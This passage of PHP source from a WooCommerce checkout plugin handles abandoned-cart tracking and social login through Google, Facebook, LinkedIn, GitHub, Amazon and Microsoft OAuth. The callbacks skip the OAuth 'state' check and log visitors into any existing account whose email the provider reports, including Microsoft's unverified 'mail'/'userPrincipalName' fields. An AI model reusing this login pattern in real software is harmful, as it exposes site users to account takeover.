	add_action('woocommerce_checkout_create_order', 'cwmp_save_recovery_cart_meta', 20, 2);
	
	function cwmp_save_recovery_cart_meta($order, $data) {
		global $wpdb;
		if (isset($_COOKIE['cwmp_recovery_cart'])) {
			$cwmp_recovery_cart = sanitize_text_field($_COOKIE['cwmp_recovery_cart']);
			$order->update_meta_data('cwmpRecoveryCart', $cwmp_recovery_cart);
			$cwmp_hash = sanitize_text_field(base64_decode($cwmp_recovery_cart));
			$update_query = $wpdb->prepare(
				"UPDATE {$wpdb->prefix}cwmp_cart_abandoned 
				SET status = %d 
				WHERE id = %s",
				1,
				$cwmp_hash
			);
			$wpdb->query($update_query);
			setcookie('cwmp_recovery_cart', '', time() - 3600, '/');
		} else {
			$order_email = $order->get_billing_email();
			$last_cart_abandoned = $wpdb->get_row(
				$wpdb->prepare(
					"SELECT id FROM {$wpdb->prefix}cwmp_cart_abandoned 
					WHERE email = %s 
					ORDER BY time DESC LIMIT 1",
					$order_email
				)
			);
			if (!empty($last_cart_abandoned)) {
				$delete_query = $wpdb->prepare(
					"DELETE FROM {$wpdb->prefix}cwmp_cart_abandoned WHERE id = %d",
					$last_cart_abandoned->id
				);
				$wpdb->query($delete_query);
			}
		}
	}
	
	//add_action( 'woocommerce_new_order', 'cwmp_remove_cart_abandoned',  1, 1  );
	function cwmp_remove_cart_abandoned($order_id) {
		cwmp_register_buy($order_id);
	} 
	function cwmp_register_buy($id){
		global $wpdb;
		$order = wc_get_order($id);
		$table_name = $wpdb->prefix . 'cwmp_cart_abandoned';
		$wpdb->delete($table_name, array(
			'email' => $order->get_billing_email()
		));
		$wpdb->delete($table_name, array(
			'phone' => $order->get_billing_phone()
		));
	}
}
	function cwmp_register_send_msgMail($id){
		
		global $wpdb;
		$order = wc_get_order($id);
		$table_name2 = $wpdb->prefix . 'cwmp_send_thank';
		$wpdb->insert($table_name2, array(
			'pedido' => $order->get_id(),
			'status' => cwmp_get_status_order($order->get_id())
		));
		
	}
if(esc_html(get_option('cwmp_ignore_cart'))=="S"){
	add_filter('template_redirect', 'cwmp_add_to_cart_redirect');
	function cwmp_add_to_cart_redirect() {
		global $woocommerce;
		if(is_cart()){
			if ( WC()->cart->get_cart_contents_count() == 0 ) {
				wp_redirect(home_url());
				exit;
			}else{
				if(get_option('cwmp_ignore_cart')=="S"){
						wp_redirect(wc_get_checkout_url());
						exit;
				}
			}
		}
	}
}
function cwmp_step_cart(){
	global $wpdb;
	$hash = WC()->session->get_session_cookie();
	if(isset($hash[0])){	
		$carts_abandoneds = $wpdb->get_results(
			$wpdb->prepare(
				"SELECT * FROM {$wpdb->prefix}cwmp_session_cart WHERE cart = %s",
				$hash[0]
			)
		);
		$table_name2 = $wpdb->prefix . 'cwmp_session_cart';
		if($wpdb->num_rows==0){
			$wpdb->insert($table_name2, array(
				'cart' => $hash[0],
				'step' => '0'
			));
		}else{
			$table_name2 = $wpdb->prefix . 'cwmp_session_cart';
			$wpdb->update($table_name2, array('step' => '0'),array('cart' => $hash[0]));
		}
	}
}
add_action ('wp_head','cwmp_step_cart');

function cwmp_step_cart_ajax(){
	global $wpdb;
	$hash = WC()->session->get_session_cookie();
	if (isset($hash[0])) {
		$step = filter_input(INPUT_POST, 'step', FILTER_SANITIZE_STRING);
		if ($step) {
			$table_name2 = $wpdb->prefix . 'cwmp_session_cart';
			$wpdb->update(
				$table_name2,
				array('step' => $step),
				array('cart' => sanitize_text_field($hash[0]))
			);
		}
	}
}
add_action( 'wp_ajax_cwmp_step_cart_ajax', 'cwmp_step_cart_ajax' );
add_action( 'wp_ajax_nopriv_cwmp_step_cart_ajax', 'cwmp_step_cart_ajax' );

function cwmp_add_loading_overlay_to_checkout() {
    if (is_checkout()) {
        ?>
        <div id="cwmp-loading-overlay">
            <div class="loading-message"><div class="spinner"></div></div>
        </div>
        <?php
    }
}
add_action('wp_head', 'cwmp_add_loading_overlay_to_checkout');
function cwmp_google_signin_button() {
    $google_oauth_redirect_uri = home_url('/?cwmp_google_callback=1');
    $params = [
        'response_type' => 'code',
        'client_id' => get_option("cwmp_google_client_id"),
        'redirect_uri' => $google_oauth_redirect_uri,
        'scope' => 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile',
        'access_type' => 'offline',
        'prompt' => 'consent'
    ];
    $auth_url = 'https://accounts.google.com/o/oauth2/auth?' . http_build_query($params);
    return '<a href="' . esc_url($auth_url) . '">
<svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M19.4307 8.19785C19.5474 8.86901 19.6055 9.54906 19.6044 10.2303C19.6044 13.2727 18.5169 15.8451 16.6245 17.5863H16.627C14.9721 19.115 12.6971 20 9.9997 20C7.34761 20 4.80415 18.9465 2.92884 17.0712C1.05354 15.1958 0 12.6524 0 10.0003C0 7.34821 1.05354 4.80475 2.92884 2.92944C4.80415 1.05413 7.34761 0.000597485 9.9997 0.000597485C12.4818 -0.0270441 14.8786 0.905342 16.6895 2.60302L13.8346 5.45793C12.8024 4.47453 11.4252 3.93587 9.9997 3.95798C7.39103 3.95798 5.17484 5.71793 4.38487 8.08785C3.96675 9.32982 3.96675 10.6745 4.38487 11.9165H4.38862C5.18234 14.2827 7.39478 16.0426 10.0035 16.0426C11.3509 16.0426 12.5084 15.6976 13.4058 15.0876H13.4021C13.9233 14.7425 14.3692 14.2953 14.7127 13.773C15.0562 13.2508 15.2903 12.6643 15.4008 12.049H9.9997V8.1991L19.4307 8.19785Z" fill="currentColor"/>
</svg>

	</a>';
}
add_shortcode('cwmp_google_signin', 'cwmp_google_signin_button');
function cwmp_google_callback() {
    $google_callback = filter_input(INPUT_GET, 'cwmp_google_callback', FILTER_SANITIZE_STRING);
    $auth_code = filter_input(INPUT_GET, 'code', FILTER_SANITIZE_STRING);
    if ($google_callback && $auth_code) {
        $client_id = get_option("cwmp_google_client_id");
        $client_secret = get_option("cwmp_google_client_secret");
        if (empty($client_id) || empty($client_secret)) {
            wp_die(esc_html__('Google OAuth credentials are not configured.', 'checkout-mestres-wp'));
        }
        $google_oauth_redirect_uri = home_url('/?cwmp_google_callback=1');
        $params = [
            'code' => $auth_code,
            'client_id' => $client_id,
            'client_secret' => $client_secret,
            'redirect_uri' => $google_oauth_redirect_uri,
            'grant_type' => 'authorization_code'
        ];
        $response = wp_remote_post('https://accounts.google.com/o/oauth2/token', [
            'body' => $params,
        ]);
        if (is_wp_error($response)) {
            wp_die(esc_html__('Failed to connect to Google OAuth server.', 'checkout-mestres-wp'));
        }
        $response_body = wp_remote_retrieve_body($response);
        $response_data = json_decode($response_body, true);
        if (isset($response_data['access_token'])) {
            $access_token = sanitize_text_field($response_data['access_token']);
            $user_info = wp_remote_get('https://www.googleapis.com/oauth2/v1/userinfo?access_token=' . $access_token);
            if (is_wp_error($user_info)) {
                wp_die(esc_html__('Failed to retrieve user information from Google.', 'checkout-mestres-wp'));
            }
            $user_info_data = json_decode(wp_remote_retrieve_body($user_info), true);
            if (isset($user_info_data['email'])) {
                $email = sanitize_email($user_info_data['email']);
                $user = get_user_by('email', $email);
                if (!$user) {
                    $username = sanitize_user(current(explode('@', $email)));
                    $random_password = wp_generate_password(12, false);
                    $user_id = wp_create_user($username, $random_password, $email);
                    $user = get_user_by('id', $user_id);
                }
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                wp_safe_redirect(wc_get_checkout_url());
                exit;
            } else {
                wp_die(esc_html__('Google account does not have an email.', 'checkout-mestres-wp'));
            }
        } else {
            wp_die(esc_html__('Failed to retrieve access token from Google.', 'checkout-mestres-wp'));
        }
    }
}
add_action('init', 'cwmp_google_callback');
function cwmp_facebook_signin_button() {
    $facebook_redirect_uri = home_url('/?cwmp_facebook_callback=1');
    $params = [
        'client_id' => get_option('cwmp_facebook_app_id'),
        'redirect_uri' => $facebook_redirect_uri,
        'scope' => 'email',
        'response_type' => 'code',
    ];
    $auth_url = 'https://www.facebook.com/v11.0/dialog/oauth?' . http_build_query($params);
    return '<a href="' . esc_url($auth_url) . '">
<svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M18.9 0H1.1C0.808262 0 0.528473 0.115893 0.322183 0.322183C0.115893 0.528473 0 0.808262 0 1.1V18.9C0 19.1917 0.115893 19.4715 0.322183 19.6778C0.528473 19.8841 0.808262 20 1.1 20H10.68V12.25H8.08V9.25H10.68V7C10.6261 6.47176 10.6885 5.93813 10.8627 5.43654C11.0369 4.93495 11.3188 4.47755 11.6885 4.09641C12.0582 3.71528 12.5068 3.41964 13.0028 3.23024C13.4989 3.04083 14.0304 2.96225 14.56 3C15.3383 2.99521 16.1163 3.03528 16.89 3.12V5.82H15.3C14.04 5.82 13.8 6.42 13.8 7.29V9.22H16.8L16.41 12.22H13.8V20H18.9C19.0445 20 19.1875 19.9715 19.321 19.9163C19.4544 19.861 19.5757 19.78 19.6778 19.6778C19.78 19.5757 19.861 19.4544 19.9163 19.321C19.9715 19.1875 20 19.0445 20 18.9V1.1C20 0.955546 19.9715 0.812506 19.9163 0.679048C19.861 0.54559 19.78 0.424327 19.6778 0.322183C19.5757 0.220038 19.4544 0.139013 19.321 0.0837326C19.1875 0.0284524 19.0445 0 18.9 0Z" fill="currentColor"/>
</svg>

	</a>';
}
add_shortcode('cwmp_facebook_signin', 'cwmp_facebook_signin_button');

function cwmp_facebook_callback() {
    $facebook_callback = filter_input(INPUT_GET, 'cwmp_facebook_callback', FILTER_SANITIZE_STRING);
    $auth_code = filter_input(INPUT_GET, 'code', FILTER_SANITIZE_STRING);
    if ($facebook_callback && $auth_code) {
        $facebook_redirect_uri = home_url('/?cwmp_facebook_callback=1');
        $params = [
            'client_id' => get_option('cwmp_facebook_app_id'),
            'redirect_uri' => $facebook_redirect_uri,
            'client_secret' => get_option('cwmp_facebook_app_secret'),
            'code' => $auth_code,
        ];
        $response = wp_remote_get('https://graph.facebook.com/v11.0/oauth/access_token?' . http_build_query($params));
        if (is_wp_error($response)) {
            wp_die(esc_html__('Failed to connect to Facebook OAuth server.', 'checkout-mestres-wp'));
        }
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (isset($data['access_token'])) {
            $access_token = sanitize_text_field($data['access_token']);
            $user_info = wp_remote_get('https://graph.facebook.com/me?fields=id,name,email&access_token=' . $access_token);
            if (is_wp_error($user_info)) {
                wp_die(esc_html__('Failed to retrieve user information from Facebook.', 'checkout-mestres-wp'));
            }
            $user_info = json_decode(wp_remote_retrieve_body($user_info), true);
            if (isset($user_info['email'])) {
                $email = sanitize_email($user_info['email']);
                $user = get_user_by('email', $email);
                if (!$user) {
                    $username = sanitize_user(current(explode('@', $email)));
                    $random_password = wp_generate_password(12, false);
                    $user_id = wp_create_user($username, $random_password, $email);
                    $user = get_user_by('id', $user_id);
                }
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                wp_safe_redirect(wc_get_checkout_url());
                exit;
            } else {
                wp_die(esc_html__('No email found for this Facebook account.', 'checkout-mestres-wp'));
            }
        } else {
            wp_die(esc_html__('Failed to retrieve access token from Facebook.', 'checkout-mestres-wp'));
        }
    }
}
add_action('init', 'cwmp_facebook_callback');
function cwmp_linkedin_signin_button() {
    $linkedin_client_id = get_option('cwmp_linkedin_client_id');
    $linkedin_redirect_uri = home_url('/?cwmp_linkedin_callback=1');
    $params = [
        'response_type' => 'code',
        'client_id' => $linkedin_client_id,
        'redirect_uri' => $linkedin_redirect_uri,
        'scope' => 'r_emailaddress r_liteprofile'
    ];
    $auth_url = 'https://www.linkedin.com/oauth/v2/authorization?' . http_build_query($params);
    return '<a href="' . esc_url($auth_url) . '">Login with LinkedIn</a>';
}
add_shortcode('cwmp_linkedin_signin', 'cwmp_linkedin_signin_button');
function cwmp_linkedin_callback() {
    $linkedin_callback = filter_input(INPUT_GET, 'cwmp_linkedin_callback', FILTER_SANITIZE_STRING);
    $auth_code = filter_input(INPUT_GET, 'code', FILTER_SANITIZE_STRING);
    if ($linkedin_callback && $auth_code) {
        $linkedin_client_id = get_option('cwmp_linkedin_client_id');
        $linkedin_client_secret = get_option('cwmp_linkedin_client_secret');
        $linkedin_redirect_uri = home_url('/?cwmp_linkedin_callback=1');
        $params = [
            'grant_type' => 'authorization_code',
            'code' => $auth_code,
            'redirect_uri' => $linkedin_redirect_uri,
            'client_id' => $linkedin_client_id,
            'client_secret' => $linkedin_client_secret
        ];
        $response = wp_remote_post('https://www.linkedin.com/oauth/v2/accessToken', [
            'body' => http_build_query($params)
        ]);
        if (is_wp_error($response)) {
            wp_die(esc_html__('Failed to connect to LinkedIn OAuth server.', 'checkout-mestres-wp'));
        }
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (isset($data['access_token'])) {
            $access_token = sanitize_text_field($data['access_token']);
            $user_info = wp_remote_get('https://api.linkedin.com/v2/me?projection=(id,firstName,lastName,emailAddress)&oauth2_access_token=' . $access_token);
            if (is_wp_error($user_info)) {
                wp_die(esc_html__('Failed to retrieve user information from LinkedIn.', 'checkout-mestres-wp'));
            }
            $user_info = json_decode(wp_remote_retrieve_body($user_info), true);
            if (isset($user_info['emailAddress'])) {
                $email = sanitize_email($user_info['emailAddress']);
                $user = get_user_by('email', $email);
                if (!$user) {
                    $username = sanitize_user(current(explode('@', $email)));
                    $random_password = wp_generate_password(12, false);
                    $user_id = wp_create_user($username, $random_password, $email);
                    $user = get_user_by('id', $user_id);
                }
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                wp_safe_redirect(home_url());
                exit;
            } else {
                wp_die(esc_html__('No email found for this LinkedIn account.', 'checkout-mestres-wp'));
            }
        } else {
            wp_die(esc_html__('Failed to retrieve access token from LinkedIn.', 'checkout-mestres-wp'));
        }
    }
}

add_action('init', 'cwmp_linkedin_callback');


// Função para exibir o botão de login do GitHub
function cwmp_github_signin_button() {
    $github_client_id = get_option('cwmp_github_client_id');
    $github_redirect_uri = home_url('/?cwmp_github_callback=1');
    $params = [
        'client_id' => $github_client_id,
        'redirect_uri' => $github_redirect_uri,
        'scope' => 'user:email'
    ];
    $auth_url = 'https://github.com/login/oauth/authorize?' . http_build_query($params);
    return '<a href="' . esc_url($auth_url) . '">
<svg width="19" height="20" viewBox="0 0 19 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M5.01925 0.32951C5.76983 0.582792 6.48364 0.934155 7.14215 1.37447C8.07274 1.13628 9.02973 1.01679 9.99032 1.01883C10.9823 1.01883 11.9394 1.1427 12.8365 1.37347C13.4947 0.933583 14.2082 0.582559 14.9584 0.32951C15.6547 0.0927452 16.6467 -0.290874 17.2361 0.361479C17.6357 0.805039 17.7356 1.5483 17.8066 2.11574C17.8865 2.74911 17.9055 3.57429 17.6957 4.39348C18.4979 5.42945 18.9814 6.66523 18.9814 8.01189C18.9814 10.0519 17.8765 11.8231 16.2411 13.0499C15.4537 13.6322 14.5809 14.0892 13.6537 14.4046C13.8675 14.8941 13.9864 15.4355 13.9864 16.004V19.001C13.9864 19.2659 13.8811 19.52 13.6938 19.7074C13.5064 19.8947 13.2523 20 12.9873 20H6.99329C6.72834 20 6.47424 19.8947 6.28689 19.7074C6.09954 19.52 5.99428 19.2659 5.99428 19.001V18.011C5.04023 18.1279 4.24002 18.024 3.5597 17.7352C2.8484 17.4335 2.3529 16.966 1.98027 16.5185C1.62662 16.0949 1.241 15.1398 0.683551 14.954C0.55905 14.9125 0.443934 14.847 0.344775 14.761C0.245616 14.6751 0.164356 14.5705 0.105634 14.4531C-0.0129584 14.2161 -0.0325467 13.9417 0.0511786 13.6903C0.134904 13.4388 0.315085 13.2309 0.552083 13.1123C0.789081 12.9937 1.06348 12.9742 1.31493 13.0579C1.98027 13.2797 2.41384 13.7592 2.71054 14.1448C3.19007 14.7642 3.57968 15.5734 4.33893 15.8961C4.65162 16.0289 5.11016 16.1159 5.82745 16.0179L5.99428 15.984C5.99658 15.4404 6.10978 14.9029 6.32695 14.4046C5.39975 14.0892 4.52694 13.6322 3.73952 13.0499C2.10414 11.8231 0.999238 10.0529 0.999238 8.01189C0.999238 6.66722 1.48176 5.43245 2.28197 4.39748C2.07217 3.57829 2.09016 2.75111 2.17008 2.11674L2.17507 2.07878C2.248 1.49735 2.33292 0.813031 2.74051 0.361479C3.32993 -0.290874 4.32294 0.0937444 5.01825 0.33051L5.01925 0.32951Z" fill="currentColor"/>
</svg>

	</a>';
}
add_shortcode('cwmp_github_signin', 'cwmp_github_signin_button');

// Função para lidar com o callback do GitHub
function cwmp_github_callback() {
    $github_callback = filter_input(INPUT_GET, 'cwmp_github_callback', FILTER_SANITIZE_STRING);
    $auth_code = filter_input(INPUT_GET, 'code', FILTER_SANITIZE_STRING);

    if ($github_callback && $auth_code) {
        $github_client_id = get_option('cwmp_github_client_id');
        $github_client_secret = get_option('cwmp_github_client_secret');
        $github_redirect_uri = home_url('/?cwmp_github_callback=1');
        $params = [
            'client_id' => $github_client_id,
            'client_secret' => $github_client_secret,
            'code' => $auth_code,
            'redirect_uri' => $github_redirect_uri
        ];
        $response = wp_remote_post('https://github.com/login/oauth/access_token', [
            'body' => http_build_query($params),
            'headers' => [
                'Accept' => 'application/json'
            ]
        ]);
        if (is_wp_error($response)) {
            wp_die(esc_html__('Failed to connect to GitHub OAuth server.', 'checkout-mestres-wp'));
        }
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (isset($data['access_token'])) {
            $access_token = sanitize_text_field($data['access_token']);
            $user_info = wp_remote_get('https://api.github.com/user', [
                'headers' => [
                    'Authorization' => 'token ' . $access_token,
                    'User-Agent' => 'WordPress'
                ]
            ]);
            if (is_wp_error($user_info)) {
                wp_die(esc_html__('Failed to retrieve user information from GitHub.', 'checkout-mestres-wp'));
            }
            $user_info = json_decode(wp_remote_retrieve_body($user_info), true);
            if (isset($user_info['email'])) {
                $email = sanitize_email($user_info['email']);
                $user = get_user_by('email', $email);
                if (!$user) {
                    $username = sanitize_user(current(explode('@', $email)));
                    $random_password = wp_generate_password(12, false);
                    $user_id = wp_create_user($username, $random_password, $email);
                    $user = get_user_by('id', $user_id);
                }
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                wp_safe_redirect(wc_get_checkout_url());
                exit;
            } else {
                wp_die(esc_html__('No email found for this GitHub account.', 'checkout-mestres-wp'));
            }
        } else {
            wp_die(esc_html__('Failed to retrieve access token from GitHub.', 'checkout-mestres-wp'));
        }
    }
}
add_action('init', 'cwmp_github_callback');

// Função para exibir o botão de login da Amazon
function cwmp_amazon_signin_button() {
    $amazon_client_id = get_option('cwmp_amazon_client_id');
    $amazon_redirect_uri = home_url('/?cwmp_amazon_callback=1');
    $params = [
        'client_id' => $amazon_client_id,
        'redirect_uri' => $amazon_redirect_uri,
        'scope' => 'profile',
        'response_type' => 'code'
    ];
    $auth_url = 'https://www.amazon.com/ap/oa?' . http_build_query($params);
    return '<a href="' . esc_url($auth_url) . '">
<svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M13.5163 14.96C13.7126 15.0638 13.9663 15.0525 14.1413 14.8975L14.1476 14.9038C14.8168 14.3103 15.4931 13.7248 16.1763 13.1475C16.3926 12.9687 16.3551 12.6825 16.1838 12.4437L16.0276 12.2312C15.5963 11.65 15.1863 11.0987 15.1863 9.9925V5.8675L15.1876 5.44875C15.1976 3.8675 15.2051 2.4225 14.0213 1.3175C13.0051 0.3425 11.3251 0 10.0376 0C7.52131 0 4.71256 0.9375 4.12006 4.05C4.06131 4.38 4.29881 4.555 4.51506 4.60375L7.08256 4.87875C7.32006 4.8675 7.49506 4.63375 7.54006 4.395C7.76006 3.32375 8.66006 2.80625 9.66881 2.80625C10.2126 2.80625 10.8301 3.00625 11.1538 3.49375C11.4838 3.98125 11.4788 4.63125 11.4751 5.21375V5.75375C11.2251 5.78125 10.9663 5.80833 10.6988 5.835C9.30756 5.9775 7.70256 6.1425 6.49881 6.6725C4.84131 7.3875 3.67506 8.85 3.67506 10.9975C3.67506 13.7475 5.40881 15.12 7.63506 15.12C9.51756 15.12 10.5451 14.6775 11.9963 13.195L12.2051 13.5025C12.5476 14.0088 12.7751 14.3463 13.5138 14.96H13.5163ZM7.53756 10.5387C7.53756 8.28375 9.55881 7.875 11.4713 7.875V8.5875C11.4726 9.5575 11.4738 10.38 10.9763 11.2538C10.5563 11.9975 9.88881 12.455 9.14506 12.455C8.13006 12.455 7.53756 11.6812 7.53756 10.5387ZM0.543806 15.2175C3.83006 17.2212 8.91631 20.3225 17.0226 16.4637C17.3726 16.3187 17.6163 16.5613 17.2713 17.0025C16.9226 17.45 14.1401 20 9.46256 20C4.79006 20 1.21006 16.8075 0.117556 15.4825C-0.182444 15.1387 0.162556 14.9825 0.366306 15.1087L0.543806 15.2175Z" fill="currentColor"/>
<path d="M17.285 14.9287C17.9937 14.8412 19.12 14.895 19.3412 15.1837C19.51 15.4037 19.3362 16.3912 19.05 17.1C18.7625 17.8037 18.335 18.3012 18.0975 18.4937C17.86 18.6862 17.6812 18.6112 17.81 18.3225C17.9412 18.035 18.665 16.2437 18.3787 15.8687C18.1125 15.5212 16.9075 15.6475 16.3475 15.7062L16.235 15.7175C16.1166 15.7283 16.0196 15.7383 15.9437 15.7475C15.7025 15.7737 15.6375 15.7812 15.6012 15.7075C15.5087 15.4462 16.575 15.0125 17.285 14.9287Z" fill="black"/>
</svg>

	</a>';
}
add_shortcode('cwmp_amazon_signin', 'cwmp_amazon_signin_button');

// Função para lidar com o callback da Amazon
function cwmp_amazon_callback() {
    $amazon_callback = filter_input(INPUT_GET, 'cwmp_amazon_callback', FILTER_SANITIZE_STRING);
    $auth_code = filter_input(INPUT_GET, 'code', FILTER_SANITIZE_STRING);
    if ($amazon_callback && $auth_code) {
        $amazon_client_id = get_option('cwmp_amazon_client_id');
        $amazon_client_secret = get_option('cwmp_amazon_client_secret');
        $amazon_redirect_uri = home_url('/?cwmp_amazon_callback=1');
        $params = [
            'grant_type' => 'authorization_code',
            'code' => $auth_code,
            'redirect_uri' => $amazon_redirect_uri,
            'client_id' => $amazon_client_id,
            'client_secret' => $amazon_client_secret
        ];
        $response = wp_remote_post('https://api.amazon.com/auth/o2/token', [
            'body' => http_build_query($params),
            'headers' => [
                'Content-Type' => 'application/x-www-form-urlencoded'
            ]
        ]);
        if (is_wp_error($response)) {
            wp_die(esc_html__('Failed to connect to Amazon OAuth server.', 'checkout-mestres-wp'));
        }
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (isset($data['access_token'])) {
            $access_token = sanitize_text_field($data['access_token']);
            $user_info = wp_remote_get('https://api.amazon.com/user/profile', [
                'headers' => [
                    'Authorization' => 'Bearer ' . $access_token
                ]
            ]);
            if (is_wp_error($user_info)) {
                wp_die(esc_html__('Failed to retrieve user information from Amazon.', 'checkout-mestres-wp'));
            }
            $user_info = json_decode(wp_remote_retrieve_body($user_info), true);
            if (isset($user_info['email'])) {
                $email = sanitize_email($user_info['email']);
                $user = get_user_by('email', $email);
                if (!$user) {
                    $username = sanitize_user(current(explode('@', $email)));
                    $random_password = wp_generate_password(12, false);
                    $user_id = wp_create_user($username, $random_password, $email);
                    $user = get_user_by('id', $user_id);
                }
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                wp_safe_redirect(wc_get_checkout_url());
                exit;
            } else {
                wp_die(esc_html__('No email found for this Amazon account.', 'checkout-mestres-wp'));
            }
        } else {
            wp_die(esc_html__('Failed to retrieve access token from Amazon.', 'checkout-mestres-wp'));
        }
    }
}
add_action('init', 'cwmp_amazon_callback');

function cwmp_add_rewrite_rules() {
    add_rewrite_rule(
        '^microsoft-callback/?',
        'index.php?cwmp_microsoft_callback=1',
        'top'
    );
}
add_action('init', 'cwmp_add_rewrite_rules');

function cwmp_add_query_vars($vars) {
    $vars[] = 'cwmp_microsoft_callback';
    return $vars;
}
add_filter('query_vars', 'cwmp_add_query_vars');
function cwmp_process_microsoft_callback() {

    if (get_query_var('cwmp_microsoft_callback') == 1) {
		cwmp_microsoft_callback();
        exit;
    }
}
add_action('template_redirect', 'cwmp_process_microsoft_callback');
function cwmp_microsoft_signin_button() {
    $microsoft_client_id = get_option('cwmp_microsoft_client_id');
    $microsoft_redirect_uri = home_url('/microsoft-callback');
    $params = [
        'client_id' => $microsoft_client_id,
        'response_type' => 'code',
        'redirect_uri' => $microsoft_redirect_uri,
        'response_mode' => 'query',
        'scope' => 'User.Read',
        'prompt' => 'select_account'
    ];
    $auth_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' . http_build_query($params);
    return '<a href="' . esc_url($auth_url) . '">
<svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
<path d="M0 0H9.47368V9.47368H0V0ZM9.47368 20H0V10.5263H9.47368V20ZM20 0V9.47368H10.5263V0H20ZM20 20H10.5263V10.5263H20V20Z" fill="currentColor"/>
</svg>

	</a>';
}
add_shortcode('cwmp_microsoft_signin', 'cwmp_microsoft_signin_button');
function cwmp_microsoft_callback() {
    $auth_code = filter_input(INPUT_GET, 'code', FILTER_SANITIZE_STRING);
    if ($auth_code) {
        $microsoft_client_id = get_option('cwmp_microsoft_client_id');
        $microsoft_client_secret = get_option('cwmp_microsoft_client_secret');
        $microsoft_redirect_uri = home_url('/microsoft-callback');
        $params = [
            'grant_type' => 'authorization_code',
            'code' => $auth_code,
            'redirect_uri' => $microsoft_redirect_uri,
            'client_id' => $microsoft_client_id,
            'client_secret' => $microsoft_client_secret
        ];
        $response = wp_remote_post('https://login.microsoftonline.com/common/oauth2/v2.0/token', [
            'body' => http_build_query($params),
            'headers' => [
                'Content-Type' => 'application/x-www-form-urlencoded'
            ]
        ]);
        if (is_wp_error($response)) {
            wp_die(esc_html__('Failed to connect to Microsoft OAuth server.', 'checkout-mestres-wp'));
        }
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);
        if (isset($data['access_token'])) {
            $access_token = sanitize_text_field($data['access_token']);
            $user_info = wp_remote_get('https://graph.microsoft.com/v1.0/me', [
                'headers' => [
                    'Authorization' => 'Bearer ' . $access_token
                ]
            ]);
            if (is_wp_error($user_info)) {
                wp_die(esc_html__('Failed to retrieve user information from Microsoft.', 'checkout-mestres-wp'));
            }
            $user_info = json_decode(wp_remote_retrieve_body($user_info), true);
            if (isset($user_info['mail']) || isset($user_info['userPrincipalName'])) {
                $email = sanitize_email(isset($user_info['mail']) ? $user_info['mail'] : $user_info['userPrincipalName']);
                $user = get_user_by('email', $email);
                if (!$user) {
                    $username = sanitize_user(current(explode('@', $email)));
                    $random_password = wp_generate_password(12, false);
                    $user_id = wp_create_user($username, $random_password, $email);
                    $user = get_user_by('id', $user_id);
                }
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID);
                wp_safe_redirect(wc_get_checkout_url());
                exit;
            } else {
                wp_die(esc_html__('No email found for this Microsoft account.', 'checkout-mestres-wp'));
            }
        } else {
            wp_die(esc_html__('Failed to retrieve access token from Microsoft.', 'checkout-mestres-wp'));
        }
    }
}
function cwmp_flush_rewrite_rules() {
    cwmp_add_rewrite_rules();
    flush_rewrite_rules();
}
register_activation_hook(__FILE__, 'cwmp_flush_rewrite_rules');
register_deactivation_hook(__FILE__, 'flush_rewrite_rules');

?>
